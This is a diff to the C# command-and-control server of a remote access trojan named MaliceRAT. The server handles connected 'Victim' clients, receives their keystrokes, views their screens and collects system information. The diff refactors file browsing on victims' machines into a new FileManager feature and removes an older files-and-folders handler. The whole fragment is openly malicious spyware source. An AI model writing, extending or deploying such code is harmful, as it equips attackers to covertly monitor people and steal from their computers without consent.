@@ -18,6 +18,7 @@ namespace MaliceRAT.RatServer
         public ScreenViewer screenViewer;
         public Heartbeat heartbeatManager;
         public Features.SystemInformation systemInformation;
+        public FileManager fileManager;
         #endregion
 
         #region Events
@@ -25,7 +26,6 @@ namespace MaliceRAT.RatServer
         public event Action<Victim> ClientConnected;
         public event Action<Victim> ClientDisconnected;
         public event Action<Victim, string> KeystrokeReceived;
-        public event Action<Victim, string> FilesAndFoldersReceived;
         #endregion
 
         #region Variables
@@ -72,6 +72,7 @@ namespace MaliceRAT.RatServer
 
             #region Features
             systemInformation = new Features.SystemInformation(this);
+            fileManager = new FileManager(this);
             screenViewer = new ScreenViewer(this);
             heartbeatManager = new Heartbeat(HeartbeatInterval, this);
             #endregion
@@ -149,10 +150,6 @@ namespace MaliceRAT.RatServer
                 case "keystroke":
                     string keystroke = jsonMessage["key"].ToString();
                     KeystrokeReceived?.Invoke(victim, keystroke);
-                    break;
-                case "files_and_folders":
-                    string filesAndFoldersJson = jsonMessage["filesAndFolders"];
-                    FilesAndFoldersReceived?.Invoke(victim, filesAndFoldersJson);
                     break;
             }
         }
